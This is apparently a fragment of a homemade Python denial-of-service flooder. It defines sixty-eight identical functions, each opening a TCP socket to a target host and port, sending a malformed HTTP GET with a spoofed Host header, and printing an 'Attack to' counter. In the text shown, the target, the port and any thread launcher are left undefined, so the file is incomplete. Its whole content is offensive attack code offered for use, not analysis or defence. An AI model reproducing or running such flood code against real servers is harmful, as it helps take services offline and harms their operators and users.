import threading, mechanize, sys, socket


fake_ip="127.0.0.1"
already_connected=1

def os1():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\r\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os2():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os3():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os4():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os5():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os6():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os7():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os8():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os9():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os10():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os11():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os12():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os13():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os14():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os15():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os16():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os17():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os18():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os19():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os20():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os21():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os22():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os23():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os24():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os25():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os26():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os27():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os28():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os29():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os30():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os31():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os32():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os33():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os34():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os35():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os36():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os37():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os38():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os39():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os40():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os41():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os42():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os43():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os44():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os45():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os46():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os47():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os48():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os49():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os50():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os51():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os52():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os53():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os54():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os55():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os56():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os57():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os58():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os59():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os60():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os61():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os62():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os63():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os64():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os65():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os66():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os67():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os68():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

